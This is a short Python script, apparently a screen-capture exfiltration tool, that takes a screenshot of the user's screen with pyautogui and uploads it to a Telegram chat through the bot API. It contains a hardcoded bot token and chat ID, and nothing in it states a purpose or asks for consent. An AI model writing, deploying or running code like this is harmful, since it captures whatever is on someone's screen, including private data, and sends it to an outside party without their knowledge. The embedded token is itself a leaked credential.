import io
import requests
import pyautogui

BOT_TOKEN = "8704965597:AAHBfgSM0gDgTWLC24kgtAWGJ3ktGD3h0qs"
CHAT_ID = "@re838102999xzjjiqlllxppcwihsaod9"

img = pyautogui.screenshot()

buffer = io.BytesIO()
img.save(buffer, format="PNG")
buffer.seek(0)

url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

requests.post(
    url,
    data={"chat_id": CHAT_ID},
    files={"photo": ("screenshot.png", buffer, "image/png")}
)
